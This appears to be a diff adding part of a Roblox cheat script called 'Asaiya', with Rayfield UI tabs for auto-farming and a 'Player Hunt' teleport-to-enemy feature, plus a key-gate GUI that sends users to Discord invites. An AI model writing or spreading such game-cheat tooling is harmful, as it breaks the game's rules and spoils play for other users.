+        local Paragraph = MiscTab:CreateParagraph({Title = "UI Belongs to", Content = "Rayfield"})
+        local Paragraph = TryTab:CreateParagraph({Title = "OPTIONS", Content = "Same as OLD VERSION But can choose multiple. With Race."})
+        local Paragraph = MainTab:CreateParagraph({Title = "Automatics", Content = "Everything here is for gaining/selling/buying Only."})
+        local Paragraph = PlayerTab:CreateParagraph({Title = "Player Hunt", Content = "Will Teleport to a player who is on the opposite team\n Make sure to Equip Fist/Foot."})
+        
+        print("SCRIPT HAS LOADED!")
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    end)
+end
+
+-- Create ScreenGui for Key Input
+local KeyScreenGui = Instance.new("ScreenGui")
+KeyScreenGui.Parent = game.CoreGui
+KeyScreenGui.ResetOnSpawn = false
+
+local KeyFrame = Instance.new("Frame")
+KeyFrame.Size = UDim2.new(0, 400, 0, 150)
+KeyFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+KeyFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+KeyFrame.BorderSizePixel = 2
+KeyFrame.Parent = KeyScreenGui
+
+local KeyLabel = Instance.new("TextLabel")
+KeyLabel.Size = UDim2.new(1, 0, 0.3, 0)
+KeyLabel.Position = UDim2.new(0, 0, 0, 0)
+KeyLabel.BackgroundColor3 = Color3.fromRGB(8, 0, 0)
+KeyLabel.Text = "ASAIYA SCRIPT KEY SYSTEM"
+KeyLabel.TextSize = 20
+KeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyLabel.Parent = KeyFrame
+
+local KeyInput = Instance.new("TextBox")
+KeyInput.Size = UDim2.new(1, -20, 0.3, 0)
+KeyInput.Position = UDim2.new(0, 10, 0.35, 0)
+KeyInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KeyInput.Text = ""
+KeyInput.TextSize = 20
+KeyInput.TextColor3 = Color3.fromRGB(6, 0, 7)
+KeyInput.Parent = KeyFrame
+
+local KeyInfo = Instance.new("TextLabel")
+KeyInfo.Size = UDim2.new(1, 0, 0.3, 0)
+KeyInfo.Position = UDim2.new(0, 0, 0.7, 0)
+KeyInfo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+KeyInfo.Text = " KEY IS ONLY AVAILABLE AT\ndiscord.gg/mkjfWXDjBu"
+KeyInfo.TextSize = 16
+KeyInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyInfo.Parent = KeyFrame
+
+local ErrorMessage = Instance.new("TextLabel")
+ErrorMessage.Size = UDim2.new(1, 0, 0.2, 0)
+ErrorMessage.Position = UDim2.new(0, 0, 0.55, 0)
+ErrorMessage.BackgroundTransparency = 1
+ErrorMessage.Text = ""
+ErrorMessage.TextSize = 18
+ErrorMessage.TextColor3 = Color3.fromRGB(255, 0, 0)
+ErrorMessage.Parent = KeyFrame
+
+KeyInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local isValid = false
+        for _, key in ipairs(validKeys) do
+            if KeyInput.Text == key then
+                isValid = true
+                break
+            end
+        end
+        
+        if isValid then
+            local originalText = KeyInput.Text
+            KeyInput.Text = "Correct Key!"
+            task.wait(1)
+            KeyInput.Text = "Loading Asaiya..."
+            task.wait(1)
+            KeyScreenGui:Destroy()
+            showOptionsGui()
+        else
+            local originalText = KeyInput.Text
+            KeyInput.Text = "Incorrect Key"
+            task.wait(1)
+            KeyInput.Text = "Join our Discord Server!"
+            task.wait(1)
+            KeyInput.Text = "https://discord.com/invite/48TQ27f8qH"
+            task.wait(2)
+            KeyInput.Text = originalText -- Restore input for retry
+        end
+    end
+end)
+
